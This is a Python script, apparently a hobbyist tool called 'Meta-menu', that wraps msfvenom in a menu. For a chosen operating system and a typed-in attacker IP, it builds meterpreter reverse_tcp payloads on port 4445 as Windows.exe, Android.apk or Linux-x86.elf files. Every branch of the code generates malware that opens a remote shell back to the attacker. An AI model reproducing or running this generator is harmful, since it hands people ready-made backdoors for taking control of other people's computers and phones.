import os
                                                     					
############################                       ############## #######  ###
#                             #     NICE              #                       ##
# Project Meta-menu rebuild #   # ####################### ####### ######## ######
#                             #     ARCH LINUX        #                       ##
############################                        ############# #######  ###

#data = ["./file1.sh","./file2.sh","./file3.sh"]
################ 
Nerver = ""
state = [1024] 
Typed = [1024]
DEBUG = "./Debug.sh"
################

def banner_Main(): # funtion main banner 
	os.system("clear && echo &&  figlet Meta.menu | lolcat && echo")
def banner_Menu(): # funtion menu banner 
	print("[1] Windows ")
	print("[2] Android ")
	print("[3] Linux   ")
# 
def banner_Windows(): # funtion Windows banner 
	os.system("clear && echo &&  figlet Windows | lolcat && echo")
def banner_Android(): # funtion android banner 
	os.system("clear && echo &&  figlet Windows | lolcat && echo")
def banner_Linux(): # funtion linux banner 
	os.system("clear && echo &&  figlet Windows | lolcat && echo")
def Error_code(): # Error message
	os.system("clear")
	os.system("echo [!] Not ip address | lolcat")
	os.system("sleep 1 && python3 Payload.py")

def Compile_pass(): # Create payload finish or status ip , payload os , port 
	os.system("clear")
	print("------ Type ------")
	print(f"Os payload : ",Typed[0])
	print(f"Ipaddress  : ",state[0])
	print(f"Port       :  4445" ) 
	print("------ End -------")
def Debuger(): #check package figlet, lolcat, metasploit 
	os.system(DEBUG)


def Number1(): # Funtion run
	banner_Main()
	banner_Menu()
	print()
	Nerver = str(input("Select option: "))
	if Nerver == "1": # if nerver == 1
		banner_Windows()
		Typed[0] = "Windows" # array typed = string windows
		print("[+] windows/meterpreter/reverse_tcp")
		print()
		state[0] = str(input("custom IP :  "))
		if len(state[0]) < 10 or len(state[0]) > 15: # Usually the letters for 10 people or more than 15 in this case error 
			Error_code() # error messge
		else: # ok pass 
			os.system("echo Please wait ... | lolcat")
			os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={state[0]} LPORT=4445 -f exe -o Windows.exe")
			Compile_pass()
	elif Nerver == "2":
		banner_Android()
		Typed[0] = "Android" # array typed = string android 
		print("[+] android/meterpreter/reverse_tcp") 
		print()
		state[0] = str(input("custom IP :  "))
		if len(state[0]) < 10 or len(state[0]) > 15: #Usually the letters for 10 people or more than 15 in this case error 
			Error_code() # error messge
		else:
			os.system("echo Please wait ... | lolcat")
			os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={state[0]} LPORT=4445 R >  Android.apk")
			Compile_pass()
	elif Nerver == "3":
		banner_Linux()
		Typed[0] = "Linux" #array typed = string linux
		print("[+] linux/x86/meterpreter_reverse_tcp")
		print()
		state[0] = str(input("custom IP :  "))
		if len(state[0]) < 10 or len(state[0]) > 15: #Usually the letters for 10 people or more than 15 in this case error 
			Error_code() # error messge
		else:
			os.system("echo Please wait ... | lolcat")
			os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={state[0]} LPORT=4445 -f elf > Linux-x86.elf")
			Compile_pass()
	else: #  Error, Select a option from the above list
		os.system("clear")
		os.system("echo [!] Error, Select a option from the above list | lolcat")
		os.system("sleep 1 && python3 Payload.py")

############################################################
# _Main_        # #   #   #  #  # # #   # # #   # # #      #
Debuger()       #  #  #    #      #     #   #       #      #
Number1()       #   # #   #  #   # # #  # # #   # #        #
# end _Main_                                    # # #      #
############################################################
#BY NXZ02 
